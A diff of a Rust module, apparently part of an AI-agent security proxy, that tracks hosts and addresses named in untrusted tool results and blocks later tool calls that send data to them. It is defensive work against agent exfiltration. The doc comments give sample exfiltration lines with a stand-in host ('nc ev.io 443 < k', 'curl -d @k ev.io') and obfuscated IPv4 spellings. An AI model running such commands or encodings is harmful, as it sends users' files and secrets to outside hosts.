@@ -62,7 +62,8 @@
 //! So one large result moves earlier results from whole to their share and
 //! clears none of them. Forgetting a short result takes the newest results
 //! kept whole plus 128 more of a full share each, all recorded after it. The
-//! store costs at most 1152 KiB, counted with [`TOKEN_OVERHEAD`] per token.
+//! store costs at most 1312 KiB, counted with [`TOKEN_OVERHEAD`] per token
+//! and [`SHORT_COST`] per short destination.
 //!
 //! What the author of a result does decide is how much of their own result
 //! competes for its share. [`RECENT_COST`] holds one maximal result whole and
@@ -90,26 +91,61 @@
 //! the call that sends them there, as a long link would. So a word shorter
 //! than [`MIN_TOKEN_LEN`] that is an IP address, an e-mail address, a link,
 //! a `host:port` or a host name is kept too, as the address, or the host it
-//! names ([`short_destination`]): at most [`MAX_SHORT_PER_RESULT`] a result,
-//! drawn by a key per proxy when there are more, and counted in the store's
-//! budget as any token is (an older result keeps them first, with its other
-//! destinations). This host's own addresses (loopback, unspecified,
-//! `localhost`) are not kept: nothing sent there leaves the host. Every other
-//! short word stays out.
+//! names ([`short_destination`]). This host's own addresses (loopback,
+//! unspecified, `localhost`) are not kept: nothing sent there leaves the
+//! host. Every other short word stays out.
+//!
+//! An IPv4 address is read in every form `inet_aton` reads, on both sides:
+//! one number (`3405803785`), hex (`0xcb007109`), octal parts, and two or
+//! three parts (`203.28937`, `203.0.28937`) are the dotted address they
+//! name (`203.0.113.9`), as `curl` and a browser connect to it. An address
+//! whose first part is 0 names no host to send to, so a small number is
+//! never one.
+//!
+//! Every short destination of the part of a result that is read is kept, as
+//! its hash under the proxy's key ([`SHORT_COST`] each): no number of other
+//! destinations around it pushes one out of a result just read. A result
+//! older than the newest ones is cut to its share as any is (see "What is
+//! kept"), its short destinations first; when that leaves some of them out,
+//! the answer that made room says how many, as an alert
+//! ([`TaintTracker::take_short_notice`]).
 //!
 //! A short destination is looked up whole, never as a piece of a longer word
-//! (`1.2.3.4` is not in `11.2.3.45`), and only where an argument sends data
-//! to it ([`short_candidates`]): in a link (`https://ev.io/c`, `//ev.io`,
-//! `mailto:x@ev.io`), in any argument; and, in an argument named for a
-//! destination (`url`, `host`, `to`, `recipients`) or a command line, an IP
-//! address or an e-mail address wherever it stands, and a host name at the
-//! start of a word (in a command line, one a `/` follows: `curl ev.io/c`).
-//! A path or a document names no destination by a short
+//! (`1.2.3.4` is not in `11.2.3.45`), and only where an argument names a
+//! place to reach ([`short_candidates`]): in a link (`https://ev.io/c`,
+//! `//ev.io`, `mailto:x@ev.io`), in any argument; and, in an argument named
+//! for a destination (`url`, `host`, `to`, `recipients`) or a command line,
+//! an IP address or an e-mail address wherever it stands, and a host name at
+//! the start of a word (in a command line, one a `/` follows: `curl ev.io/c`,
+//! or the host a command that sends data sends it to: `nc ev.io 443 < k`,
+//! `curl -d @k ev.io`). A path or a document names no destination by a short
 //! word: a file name (`main.rs`) is written like a host name, `main.rs:120`
 //! like a host and a port, and an address quoted in a page the agent writes
-//! back is not where it sends the page. What this gives up: a short host
-//! name written bare in a command line (`ping ev.io`, `nc ev.io 443`) is not
-//! caught, nor a short destination in an argument named for neither.
+//! back is not where it sends the page.
+//!
+//! # A short destination refuses only a call that sends it data
+//!
+//! A page names the places it is about: a README names `github.com` and
+//! `docs.rs`, a guide names `1.1.1.1` as a resolver. Reaching one of them to
+//! read is what the page is for, so a call that names a short destination a
+//! result named is refused only when it sends that place data
+//! ([`sends_data`]): a body, a file, an upload, a form or a message in the
+//! call (`body`, `data`, `content`, `attachments`, a `POST`, `PUT` or
+//! `PATCH` method, a tool named for sending: `send_*`, `*_post`,
+//! `upload_*`), an e-mail address it mails to, a webhook it registers, or a
+//! command line that sends (`curl -d`/`-F`/`-T`, `wget --post-data`, `nc`
+//! or `ssh` with input, `scp`, `rsync`, `mail`, `git push`). A call that
+//! only reaches it (a fetch, a `git clone`, a `dig @1.1.1.1`) raises the
+//! same `AG-TAINT` as an alert that does not block, and a link quoted in
+//! the text the call sends (a `body`, a `message`) is the text, not where
+//! it goes: an alert too. A long token (a URL with a path or a key, a long
+//! host) refuses as before, whatever the call sends.
+//!
+//! What this gives up: a short host name written bare in a command line
+//! that sends nothing (`ping ev.io`) is not looked up, nor a short
+//! destination in an argument named for neither a destination nor a
+//! command; a value sent in the query of a fetch (`https://ev.io/?k=...`) is
+//! refused only when it is itself a value a result said, as a long token.
 //!
 //! The destinations a call names are the agent's own for the answer to that
 //! call, as its whole values are (see "A value the agent sent").
@@ -210,17 +246,21 @@ const TOKEN_OVERHEAD: usize = 96;
 /// Cap on how much of one tool result is scanned for tokens: what the router
 /// hands over (it scans at most 64 KiB of a result).
 const MAX_SCAN_BYTES: usize = 64 * 1024;
-/// The most destinations shorter than [`MIN_TOKEN_LEN`] kept from one result
-/// (see "Short destinations"). Past it, the ones kept are drawn by a key
-/// drawn per proxy, so whoever wrote the result cannot choose them.
-const MAX_SHORT_PER_RESULT: usize = 256;
+/// What one kept destination shorter than [`MIN_TOKEN_LEN`] costs (see
+/// "Short destinations"): its keyed hash and the number of the result that
+/// holds it.
+const SHORT_COST: usize = 16;
+/// The most destinations shorter than [`MIN_TOKEN_LEN`] one read result can
+/// name, every one of them kept: the shortest is three bytes (`1.2`, the
+/// address 1.0.0.2) and one more parts it from the next.
+const MAX_SHORT_PER_RESULT: usize = MAX_SCAN_BYTES / 4;
 /// The most one result can cost: every token as short as is tracked, one byte
-/// of whitespace apart, and as many short destinations as are kept.
+/// of whitespace apart, and every short destination it can name.
 const MAX_RESULT_COST: usize = MAX_SCAN_BYTES
     + (MAX_SCAN_BYTES / (MIN_TOKEN_LEN + 1) + 1) * TOKEN_OVERHEAD
-    + MAX_SHORT_PER_RESULT * (MIN_TOKEN_LEN - 1 + TOKEN_OVERHEAD);
+    + MAX_SHORT_PER_RESULT * SHORT_COST;
 /// What the newest results, kept whole, may cost together.
-const RECENT_COST: usize = 640 * 1024;
+const RECENT_COST: usize = 800 * 1024;
 /// What the samples of the results older than those may cost together.
 const OLDER_COST: usize = 512 * 1024;
 /// What the sample of one older result may cost.
@@ -361,10 +401,14 @@ pub struct TaintTracker {
     /// start, so a search in an argument stops only at the positions where a
     /// kept token starts.
     starts: HashMap<[u8; MIN_TOKEN_LEN], Start>,
-    /// The kept tokens shorter than [`MIN_TOKEN_LEN`] (short destinations,
-    /// see "Short destinations"), to their slot: found whole, never inside a
-    /// longer text.
-    short: HashMap<Box<str>, u32>,
+    /// The kept destinations shorter than [`MIN_TOKEN_LEN`] (see "Short
+    /// destinations"), each one's keyed hash ([`TaintTracker::hash_of`]) to
+    /// the number of the result that holds it: found whole, never inside a
+    /// longer text. Not in `tokens`.
+    short: HashMap<u64, u64>,
+    /// How many short destinations a result cut to its share left out since
+    /// the router last asked ([`TaintTracker::take_short_notice`]).
+    short_dropped: usize,
     /// The key of the tokens' hashes. Drawn per proxy, so no result can make
     /// its tokens collide.
     hash_key: RandomState,
@@ -609,33 +653,42 @@ impl TaintTracker {
                 && verbatim.as_ref().is_none_or(|said| said.contains(&*raw));
             whole_cost += self.take(tok, provenance, &mut seen_again, own);
         }
-        // Destinations shorter than a token (see "Short destinations"), the
-        // ones the call itself named left out as above.
+        // Destinations shorter than a token (see "Short destinations"), every
+        // one, the ones the call itself named left out as above.
         let said_short: Option<HashSet<String>> = match (&canon, sent) {
-            (Cow::Owned(_), Some(_)) => Some(
-                short_destinations(text, &self.sample_key)
-                    .into_iter()
-                    .collect(),
-            ),
+            (Cow::Owned(_), Some(_)) => Some(short_destinations(text).into_iter().collect()),
             _ => None,
         };
-        for dest in short_destinations(&canon, &self.sample_key) {
+        let mut short_again: Vec<u64> = Vec::new();
+        for dest in short_destinations(&canon) {
             let own = sent.is_some_and(|sent| sent.contains(dest.as_str()))
                 && said_short.as_ref().is_none_or(|said| said.contains(&dest));
-            whole_cost += self.take(&dest, provenance, &mut seen_again, own);
+            whole_cost += self.take_short(&dest, &mut short_again, own);
         }
         seen_again.sort_unstable();
         seen_again.dedup();
+        short_again.sort_unstable();
+        short_again.dedup();
         whole_cost += seen_again
             .iter()
             .map(|&slot| cost_of(&self.tokens[slot].token))
-            .sum::<usize>();
+            .sum::<usize>()
+            + short_again.len() * SHORT_COST;
+        let keeps_all = |tracker: &Self, holder: u64| {
+            tracker.result_cost.get(&holder).copied().unwrap_or(0) <= OLDER_SHARE
+        };
         for slot in seen_again {
             let holder = self.tokens[slot].result;
-            let holder_keeps_all =
-                self.result_cost.get(&holder).copied().unwrap_or(0) <= OLDER_SHARE;
-            if whole_cost <= OLDER_SHARE || !holder_keeps_all {
+            if whole_cost <= OLDER_SHARE || !keeps_all(self, holder) {
                 self.move_to_newest(slot);
+            }
+        }
+        for hash in short_again {
+            let Some(&holder) = self.short.get(&hash) else {
+                continue;
+            };
+            if whole_cost <= OLDER_SHARE || !keeps_all(self, holder) {
+                self.move_short_to_newest(hash, holder);
             }
         }
         if self.cost > RECENT_COST + OLDER_COST {
@@ -674,6 +727,42 @@ impl TaintTracker {
         }
     }
 
+    /// [`TaintTracker::take`] for a short destination, kept by its hash: one
+    /// an earlier result holds is noted in `seen_again`. Returns what keeping
+    /// it cost.
+    fn take_short(&mut self, dest: &str, seen_again: &mut Vec<u64>, own: bool) -> usize {
+        let hash = self.hash_of(dest.as_bytes());
+        match self.short.get(&hash) {
+            Some(&holder) => {
+                if holder != self.results {
+                    seen_again.push(hash);
+                }
+                0
+            }
+            None if own => 0,
+            None => {
+                self.short.insert(hash, self.results);
+                self.cost += SHORT_COST;
+                *self.result_cost.entry(self.results).or_default() += SHORT_COST;
+                SHORT_COST
+            }
+        }
+    }
+
+    /// The router's alert when results cut to their share left short
+    /// destinations out since it last asked (see "Short destinations"); each
+    /// count is said once.
+    pub(crate) fn take_short_notice(&mut self) -> Option<String> {
+        let dropped = std::mem::take(&mut self.short_dropped);
+        (dropped > 0).then(|| {
+            format!(
+                "{dropped} short destinations (a host, an address) that earlier tool results \
+                 named were not kept, to keep memory bounded: a later call that sends data to \
+                 one of them is no longer refused for it"
+            )
+        })
+    }
+
     /// If a string value in the arguments of a call to `tool` contains a
     /// recorded result token, return an `AG-TAINT` alert (marked `block`)
     /// naming the tainting token; else `None`.
@@ -681,13 +770,17 @@ impl TaintTracker {
     /// The one exemption is a listing token read back as a whole path by a
     /// read-only tool (see the module docs); every other reuse alerts.
     pub fn arg_taint_alert(&self, tool: &str, args: &Value) -> Option<VerdictAlert> {
-        if self.tokens.is_empty() {
+        if self.tokens.is_empty() && self.short.is_empty() {
             return None;
         }
         let read_only = READ_ONLY_TOOLS.contains(&tool) && other_args_are_inert(args);
         let mut steps = MAX_SEARCH_STEPS;
-        let mut hit: Result<Option<usize>, Unchecked> = Ok(None);
-        walk_args(args, &mut |s, is_path_arg, key| {
+        let mut hit: Result<Option<Found>, Unchecked> = Ok(None);
+        // A kept short destination the call only reaches (see "A short
+        // destination refuses only a call that sends it data").
+        let mut reached: Option<String> = None;
+        let call_sends = !self.short.is_empty() && sends_data(tool, args);
+        walk_args(args, &mut |s, is_path_arg, key, in_text| {
             if hit != Ok(None) {
                 return;
             }
@@ -698,38 +791,114 @@ impl TaintTracker {
                     && is_local_path(s)
                     && names_whole_components(s, &rec.token))
             };
-            hit = self.first_recorded_in(s, &mut steps, exempt);
+            let token = |found: Option<usize>| found.map(Found::Token);
+            hit = self.first_recorded_in(s, &mut steps, exempt).map(token);
             // An address is kept lowercased ([`tokenize`]): one
             // sent in other capitals is the same address.
             if hit == Ok(None) && s.contains('@') && s.bytes().any(|b| b.is_ascii_uppercase()) {
-                hit = self.first_recorded_in(&s.to_ascii_lowercase(), &mut steps, exempt);
+                hit = self
+                    .first_recorded_in(&s.to_ascii_lowercase(), &mut steps, exempt)
+                    .map(token);
             }
             // The same value in another spelling: results are recorded in one
             // (`super::canon`), and a destination with a scheme or a trailing
             // `/` more or less is the same destination.
             if hit == Ok(None) {
                 for form in spellings(s) {
-                    hit = self.first_recorded_in(&form, &mut steps, exempt);
+                    hit = self.first_recorded_in(&form, &mut steps, exempt).map(token);
                     if hit != Ok(None) {
                         break;
                     }
                 }
             }
-            // A destination shorter than a token, named where data is sent
-            // (see "Short destinations"), as written or in one spelling.
-            if hit == Ok(None) && !self.short.is_empty() {
-                let place = ArgPlace::of(key, is_path_arg);
-                let canon = super::canon::canonical(s);
-                hit = self.first_short_in(s, place, &mut steps, exempt);
-                if hit == Ok(None) && canon != s {
-                    hit = self.first_short_in(&canon, place, &mut steps, exempt);
+            // A destination shorter than a token, named where it is reached
+            // (see "Short destinations"), as written or in one spelling. A
+            // command line is read whole below, where what it sends is known.
+            let place = ArgPlace::of(key, is_path_arg);
+            if hit != Ok(None) || self.short.is_empty() || place == ArgPlace::Command {
+                return;
+            }
+            let webhook = key.is_some_and(|key| key.to_ascii_lowercase().contains("webhook"));
+            let canon = super::canon::canonical(s);
+            let mut forms = vec![s];
+            if canon != s {
+                forms.push(canon.as_ref());
+            }
+            for form in forms {
+                match self.kept_shorts(short_candidates(form, place), form.len(), &mut steps) {
+                    Err(unchecked) => hit = Err(unchecked),
+                    Ok(kept) => {
+                        for dest in kept {
+                            // An address mailed to is sent data; any other
+                            // place is when the call carries data and this is
+                            // not a link quoted in the text it sends.
+                            let sends = (dest.contains('@') && place == ArgPlace::Destination)
+                                || (!in_text && (call_sends || webhook));
+                            if sends {
+                                hit = Ok(Some(Found::Short(dest)));
+                                break;
+                            }
+                            reached.get_or_insert(dest);
+                        }
+                    }
+                }
+                if hit != Ok(None) {
+                    break;
                 }
             }
         });
+        // The command lines, each simple command read for what it sends and
+        // where (see "A short destination refuses only a call that sends it
+        // data").
+        if hit == Ok(None) && !self.short.is_empty() {
+            for line in command_lines(args) {
+                let canon = super::canon::canonical(&line).into_owned();
+                for form in [line.as_str(), canon.as_str()] {
+                    for (dests, sends) in command_destinations(form) {
+                        match self.kept_shorts(dests, form.len(), &mut steps) {
+                            Err(unchecked) => hit = Err(unchecked),
+                            Ok(kept) => {
+                                for dest in kept {
+                                    if sends {
+                                        hit = Ok(Some(Found::Short(dest)));
+                                        break;
+                                    }
+                                    reached.get_or_insert(dest);
+                                }
+                            }
+                        }
+                        if hit != Ok(None) {
+                            break;
+                        }
+                    }
+                    if hit != Ok(None) || canon == line {
+                        break;
+                    }
+                }
+                if hit != Ok(None) {
+                    break;
+                }
+            }
+        }
         match hit {
-            Ok(None) => None,
-            Ok(Some(slot)) => {
-                let shown: String = self.tokens[slot].token.chars().take(32).collect();
+            Ok(None) => reached.map(|dest| {
+                let shown: String = dest.chars().take(32).collect();
+                VerdictAlert::builtin(
+                    "AG-TAINT",
+                    format!(
+                        "tool-call argument names a destination an untrusted tool result named \
+                         (`{shown}…`) and sends it no data (no body, file, upload, recipient or \
+                         sending command): an alert, not a refusal"
+                    ),
+                    false,
+                )
+            }),
+            Ok(Some(found)) => {
+                let shown: String = match &found {
+                    Found::Token(slot) => self.tokens[*slot].token.chars().take(32).collect(),
+                    Found::Short(dest) => dest.chars().take(32).collect(),
+                    Found::Hash(_) => String::new(),
+                };
                 Some(VerdictAlert::builtin(
                     "AG-TAINT",
                     format!(
@@ -751,26 +920,24 @@ impl TaintTracker {
         }
     }
 
-    /// The first kept short destination that `counts` accepts among those
-    /// `s` names ([`short_candidates`]). `steps` as in
+    /// The `candidates` (read from `read` bytes of an argument) that are
+    /// kept short destinations, in order. `steps` as in
     /// [`Self::first_recorded_in`].
-    fn first_short_in(
+    fn kept_shorts(
         &self,
-        s: &str,
-        place: ArgPlace,
+        candidates: Vec<String>,
+        read: usize,
         steps: &mut usize,
-        counts: impl Fn(&Recorded) -> bool,
-    ) -> Result<Option<usize>, Unchecked> {
-        *steps = steps.checked_sub(s.len()).ok_or(Unchecked)?;
-        for candidate in short_candidates(s, place) {
+    ) -> Result<Vec<String>, Unchecked> {
+        *steps = steps.checked_sub(read).ok_or(Unchecked)?;
+        let mut kept = Vec::new();
+        for candidate in candidates {
             *steps = steps.checked_sub(1).ok_or(Unchecked)?;
-            if let Some(&slot) = self.short.get(candidate.as_str()) {
-                if counts(&self.tokens[slot as usize]) {
-                    return Ok(Some(slot as usize));
-                }
+            if self.short.contains_key(&self.hash_of(candidate.as_bytes())) {
+                kept.push(candidate);
             }
         }
-        Ok(None)
+        Ok(kept)
     }
 
     /// A hasher for a token or the bytes of an argument, under this proxy's
@@ -869,9 +1036,6 @@ impl TaintTracker {
 
     /// The slot that holds `token`, if it is kept.
     fn find(&self, token: &str) -> Option<usize> {
-        if token.len() < MIN_TOKEN_LEN {
-            return self.short.get(token).map(|&slot| slot as usize);
-        }
         let slot = *self.exact.get(&self.hash_of(token.as_bytes()))? as usize;
         if *self.tokens[slot].token == *token {
             return Some(slot);
@@ -885,11 +1049,6 @@ impl TaintTracker {
     /// Index the token in `slot`: by its hash, and at the head of its start's
     /// chain.
     fn index_slot(&mut self, slot: usize) {
-        if self.tokens[slot].token.len() < MIN_TOKEN_LEN {
-            let token = self.tokens[slot].token.clone();
-            self.short.entry(token).or_insert(slot as u32);
-            return;
-        }
         let token = &self.tokens[slot].token;
         let hash = self.hash_of(token.as_bytes());
         let len = token.len() as u16;
@@ -936,6 +1095,18 @@ impl TaintTracker {
         *self.result_cost.entry(self.results).or_default() += cost;
     }
 
+    /// Hand the short destination `hash` from `holder` to the newest result.
+    fn move_short_to_newest(&mut self, hash: u64, holder: u64) {
+        if let Some(held) = self.result_cost.get_mut(&holder) {
+            *held -= SHORT_COST;
+            if *held == 0 {
+                self.result_cost.remove(&holder);
+            }
+        }
+        self.short.insert(hash, self.results);
+        *self.result_cost.entry(self.results).or_default() += SHORT_COST;
+    }
+
     /// Bring the store back within its budget: the newest results whole up to
     /// [`RECENT_COST`], then a sample of up to [`OLDER_SHARE`] of each older
     /// one up to [`OLDER_COST`], newest first; anything older is forgotten.
@@ -971,45 +1142,95 @@ impl TaintTracker {
             .iter()
             .map(|rec| fate_of(rec) == Fate::Whole)
             .collect();
+        let fate_of_result = |result: u64| fates.get(&result).copied().unwrap_or(Fate::Forget);
+        let mut keep_short: HashSet<u64> = self
+            .short
+            .iter()
+            .filter(|(_, &result)| fate_of_result(result) == Fate::Whole)
+            .map(|(&hash, _)| hash)
+            .collect();
         // A sampled result keeps its network destinations first, up to
-        // DESTINATION_SHARE, then its tokens in the order the key gives them,
-        // up to its share.
-        let mut sampled: Vec<(u64, bool, u64, usize)> = self
+        // DESTINATION_SHARE, its short ones (see "Short destinations") before
+        // the others, then its tokens in the order the key gives them, up to
+        // its share. A short destination's hash is under the proxy's key: its
+        // order too is one the author of the result cannot choose.
+        #[derive(PartialEq, Eq, PartialOrd, Ord)]
+        enum Class {
+            Short,
+            Destination,
+            Ordinary,
+        }
+        let mut sampled: Vec<(u64, Class, u64, Found)> = self
             .tokens
             .iter()
             .enumerate()
             .filter(|(_, rec)| fate_of(rec) == Fate::Sample)
             .map(|(slot, rec)| {
                 let rank = self.sample_key.hash_one(rec.token.as_ref());
-                // A short token is a destination (see "Short destinations").
-                let destination = rec.token.len() < MIN_TOKEN_LEN || is_destination(&rec.token);
-                (rec.result, !destination, rank, slot)
+                let class = if is_destination(&rec.token) {
+                    Class::Destination
+                } else {
+                    Class::Ordinary
+                };
+                (rec.result, class, rank, Found::Token(slot))
             })
+            .chain(
+                self.short
+                    .iter()
+                    .filter(|(_, &result)| fate_of_result(result) == Fate::Sample)
+                    .map(|(&hash, &result)| (result, Class::Short, hash, Found::Hash(hash))),
+            )
             .collect();
         sampled.sort_unstable();
         // (result, spent on destinations, spent in all)
         let mut spent: (u64, usize, usize) = (0, 0, 0);
-        for (result, ordinary, _, slot) in sampled {
+        let mut short_sampled = 0;
+        for (result, class, _, item) in sampled {
             if spent.0 != result {
                 spent = (result, 0, 0);
             }
-            let cost = cost_of(&self.tokens[slot].token);
+            let cost = match &item {
+                Found::Token(slot) => cost_of(&self.tokens[*slot].token),
+                _ => SHORT_COST,
+            };
+            let ordinary = class == Class::Ordinary;
             let fits =
                 spent.2 + cost <= OLDER_SHARE && (ordinary || spent.1 + cost <= DESTINATION_SHARE);
+            if class == Class::Short {
+                short_sampled += 1;
+            }
             if fits {
                 if !ordinary {
                     spent.1 += cost;
                 }
                 spent.2 += cost;
-                keep[slot] = true;
+                match item {
+                    Found::Token(slot) => keep[slot] = true,
+                    Found::Hash(hash) => {
+                        keep_short.insert(hash);
+                    }
+                    Found::Short(_) => {}
+                }
             }
         }
+        // What a result cut to its share left out is said (see "Short
+        // destinations"); a result forgotten whole is the store's age, as
+        // for every token.
+        let short_kept_sampled = self
+            .short
+            .iter()
+            .filter(|(hash, &result)| {
+                fate_of_result(result) == Fate::Sample && keep_short.contains(*hash)
+            })
+            .count();
+        self.short_dropped += short_sampled - short_kept_sampled;
 
         let mut slot = 0;
         self.tokens.retain(|_| {
             slot += 1;
             keep[slot - 1]
         });
+        self.short.retain(|hash, _| keep_short.contains(hash));
         self.reindex();
     }
 
@@ -1017,7 +1238,6 @@ impl TaintTracker {
     fn reindex(&mut self) {
         self.exact.clear();
         self.starts.clear();
-        self.short.clear();
         self.cost = 0;
         self.result_cost.clear();
         for slot in 0..self.tokens.len() {
@@ -1027,7 +1247,22 @@ impl TaintTracker {
             self.cost += cost;
             *self.result_cost.entry(rec.result).or_default() += cost;
         }
+        for &result in self.short.values() {
+            self.cost += SHORT_COST;
+            *self.result_cost.entry(result).or_default() += SHORT_COST;
+        }
     }
+}
+
+/// What a search of a call's arguments found, or one entry of the store.
+#[derive(Debug, PartialEq, Eq, PartialOrd, Ord)]
+enum Found {
+    /// The kept token in this slot.
+    Token(usize),
+    /// A kept short destination, as the call names it.
+    Short(String),
+    /// A kept short destination, by its hash.
+    Hash(u64),
 }
 
 /// The index key of a token, or of the text at one position of an argument:
@@ -1073,11 +1308,10 @@ fn is_destination(token: &str) -> bool {
 }
 
 /// The destinations shorter than [`MIN_TOKEN_LEN`] a result names, each in
-/// the form it is kept in ([`short_destination`]), at most
-/// [`MAX_SHORT_PER_RESULT`] of them, drawn by `key` when there are more.
-/// Read in the part of the text [`tokenize`] reads, word by word, a word
-/// taken out of its quotes and brackets.
-fn short_destinations(text: &str, key: &RandomState) -> Vec<String> {
+/// the form it is kept in ([`short_destination`]), every one of them (at most
+/// [`MAX_SHORT_PER_RESULT`]). Read in the part of the text [`tokenize`]
+/// reads, word by word, a word taken out of its quotes and brackets.
+fn short_destinations(text: &str) -> Vec<String> {
     let mut out: Vec<String> = Vec::new();
     let mut seen: HashSet<String> = HashSet::new();
     for raw in scanned_part(text).split_whitespace() {
@@ -1086,19 +1320,21 @@ fn short_destinations(text: &str, key: &RandomState) -> Vec<String> {
                 .trim_start_matches(['(', '<', '{'])
                 .trim_end_matches(TRAILING)
                 .trim_end_matches('>');
-            if piece.is_empty() || piece.len() >= MIN_TOKEN_LEN {
+            if piece.is_empty() {
                 continue;
             }
-            if let Some(dest) = short_destination(piece) {
+            // A longer word is a token; an address in it is kept as an
+            // address too, so another form of it is found (see "Short
+            // destinations").
+            let dest = short_destination(piece).filter(|dest| {
+                piece.len() < MIN_TOKEN_LEN || dest.parse::<std::net::IpAddr>().is_ok()
+            });
+            if let Some(dest) = dest {
                 if seen.insert(dest.clone()) {
                     out.push(dest);
                 }
             }
         }
-    }
-    if out.len() > MAX_SHORT_PER_RESULT {
-        out.sort_by_key(|dest| key.hash_one(dest.as_str()));
-        out.truncate(MAX_SHORT_PER_RESULT);
     }
     out
 }
@@ -1106,8 +1342,9 @@ fn short_destinations(text: &str, key: &RandomState) -> Vec<String> {
 /// A word shorter than a token that names somewhere data can be sent, in the
 /// form it is kept in: an e-mail address (lower-cased), else the host of a
 /// link, of a `host:port` or of a bare host name, an address in its usual
-/// spelling. `None` for anything else, and for this host's own addresses
-/// (loopback, unspecified, `localhost`): nothing sent there leaves the host.
+/// spelling (whichever form `inet_aton` reads it in: [`numeric_host`]).
+/// `None` for anything else, and for this host's own addresses (loopback,
+/// unspecified, `localhost`): nothing sent there leaves the host.
 fn short_destination(word: &str) -> Option<String> {
     let word = word.to_ascii_lowercase();
     if word.contains('@') {
@@ -1120,7 +1357,8 @@ fn short_destination(word: &str) -> Option<String> {
         None => word.as_str(),
     };
     let authority = rest.split(['/', '?', '#']).next().unwrap_or_default();
-    destination_host(host_of_authority(authority)?)
+    let host = host_of_authority(authority)?;
+    destination_host(host).or_else(|| numeric_host(host))
 }
 
 /// The host of an authority: `host`, `host:port`, `[v6]` or `[v6]:port`, or
@@ -1148,6 +1386,54 @@ fn destination_host(host: &str) -> Option<String> {
         return (!ip.is_loopback() && !ip.is_unspecified()).then(|| ip.to_string());
     }
     (is_hostname(host) && host != "localhost").then(|| host.to_string())
+}
+
+/// An IPv4 address in a form `inet_aton` reads and the usual parser does
+/// not (one number, two or three parts, a hex or an octal part), in its
+/// usual spelling: `3405803785`, `0xcb007109`, `203.28937` and
+/// `0313.0.0161.011` are `203.0.113.9`. `None` for this host's own
+/// addresses and for an address whose first part is 0, which names no host
+/// to reach: a small number is never one.
+fn numeric_host(host: &str) -> Option<String> {
+    if host.parse::<std::net::IpAddr>().is_ok() {
+        return None;
+    }
+    let ip = inet_aton(host)?;
+    (!ip.is_loopback() && ip.octets()[0] != 0).then(|| ip.to_string())
+}
+
+/// `text` read as `inet_aton` reads an IPv4 address: one to four parts
+/// apart by dots, each decimal, hex (`0x`) or octal (a leading `0`), the
+/// last one filling what the others leave.
+fn inet_aton(text: &str) -> Option<std::net::Ipv4Addr> {
+    if text.is_empty() || text.len() > 64 {
+        return None;
+    }
+    let mut parts: Vec<u64> = Vec::with_capacity(4);
+    for part in text.split('.') {
+        if parts.len() == 4 {
+            return None;
+        }
+        let (digits, radix) = match part.strip_prefix("0x").or_else(|| part.strip_prefix("0X")) {
+            Some(hex) => (hex, 16),
+            None if part.len() > 1 && part.starts_with('0') => (&part[1..], 8),
+            None => (part, 10),
+        };
+        if digits.is_empty() || digits.len() > 11 || !digits.chars().all(|c| c.is_digit(radix)) {
+            return None;
+        }
+        parts.push(u64::from_str_radix(digits, radix).ok()?);
+    }
+    let (&last, head) = parts.split_last()?;
+    let room = 8 * (4 - head.len() as u32);
+    if head.iter().any(|&part| part > 255) || last >= 1u64 << room {
+        return None;
+    }
+    let mut value = last;
+    for (i, &part) in head.iter().enumerate() {
+        value |= part << (24 - 8 * i as u32);
+    }
+    u32::try_from(value).ok().map(std::net::Ipv4Addr::from)
 }
 
 /// Whether `host` (lower-case) is written as a host name: two labels or
@@ -1289,6 +1575,11 @@ fn short_candidates(s: &str, place: ArgPlace) -> Vec<String> {
             if where_sent {
                 out.extend(destination_host(host));
             }
+            // An address in another form `inet_aton` reads, only where a
+            // host stands: a number elsewhere is an id, a size, a time.
+            if in_link || (place == ArgPlace::Destination && word_start) {
+                out.extend(numeric_host(host));
+            }
         }
         // An address after a colon (`ip:1.2.3.4`, `x:1.2.3.4:80`).
         if anywhere {
@@ -1377,45 +1668,916 @@ fn names_whole_components(arg: &str, token: &str) -> bool {
 /// argument: the value of a top-level [`PATH_ARGS`] key, or a string directly
 /// in an array under one. Everything else, nested values included, is not.
 /// Each leaf comes with the key it sits under (the nearest one), `None` for
-/// a leaf under no key.
-fn walk_args(args: &Value, f: &mut impl FnMut(&str, bool, Option<&str>)) {
+/// a leaf under no key, and whether it is in the text the call sends: under
+/// a key of [`TEXT_KEYS`] at any depth.
+fn walk_args(args: &Value, f: &mut impl FnMut(&str, bool, Option<&str>, bool)) {
     let Value::Object(map) = args else {
-        walk_keyed(args, None, &mut |s, key| f(s, false, key));
+        walk_keyed(args, None, false, &mut |s, key, in_text| {
+            f(s, false, key, in_text)
+        });
         return;
     };
     for (key, value) in map {
         let is_path_arg = PATH_ARGS.contains(&key.as_str());
+        let in_text = is_text_key(key);
         match value {
-            Value::String(s) => f(s, is_path_arg, Some(key)),
+            Value::String(s) => f(s, is_path_arg, Some(key), in_text),
             Value::Array(items) => {
                 for item in items {
                     match item {
-                        Value::String(s) => f(s, is_path_arg, Some(key)),
-                        other => walk_keyed(other, Some(key), &mut |s, key| f(s, false, key)),
+                        Value::String(s) => f(s, is_path_arg, Some(key), in_text),
+                        other => walk_keyed(other, Some(key), in_text, &mut |s, key, in_text| {
+                            f(s, false, key, in_text)
+                        }),
                     }
                 }
             }
-            other => walk_keyed(other, Some(key), &mut |s, key| f(s, false, key)),
+            other => walk_keyed(other, Some(key), in_text, &mut |s, key, in_text| {
+                f(s, false, key, in_text)
+            }),
         }
     }
 }
 
-/// [`walk_strings`], with the key each string sits under (the nearest one).
-fn walk_keyed(v: &Value, key: Option<&str>, f: &mut impl FnMut(&str, Option<&str>)) {
+/// [`walk_strings`], with the key each string sits under (the nearest one),
+/// and whether a key above it is one of [`TEXT_KEYS`].
+fn walk_keyed(
+    v: &Value,
+    key: Option<&str>,
+    in_text: bool,
+    f: &mut impl FnMut(&str, Option<&str>, bool),
+) {
     match v {
-        Value::String(s) => f(s, key),
+        Value::String(s) => f(s, key, in_text),
         Value::Array(items) => {
             for item in items {
-                walk_keyed(item, key, f);
+                walk_keyed(item, key, in_text, f);
             }
         }
         Value::Object(map) => {
             for (k, item) in map {
-                walk_keyed(item, Some(k), f);
+                walk_keyed(item, Some(k), in_text || is_text_key(k), f);
             }
         }
         _ => {}
     }
+}
+
+/// The keys whose value is text a call sends (a mail's body, a message, a
+/// page): a link quoted there is part of the text, not where the call goes.
+const TEXT_KEYS: &[&str] = &[
+    "body",
+    "content",
+    "contents",
+    "text",
+    "html",
+    "markdown",
+    "message",
+    "messages",
+    "msg",
+    "comment",
+    "comments",
+    "document",
+    "description",
+    "blocks",
+    "summary",
+    "title",
+    "subject",
+    "note",
+    "notes",
+    "caption",
+    "prompt",
+];
+
+fn is_text_key(key: &str) -> bool {
